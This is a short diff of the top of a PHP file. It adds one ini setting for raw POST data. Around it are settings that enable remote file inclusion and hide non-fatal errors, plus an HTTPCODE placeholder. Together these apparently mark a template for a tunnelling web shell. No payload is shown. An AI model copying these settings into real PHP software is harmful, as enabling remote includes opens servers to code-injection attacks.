@@ -1,6 +1,7 @@
 <?php
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
+ini_set('always_populate_raw_post_data', -1);
 error_reporting(E_ERROR | E_PARSE);
 
 if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
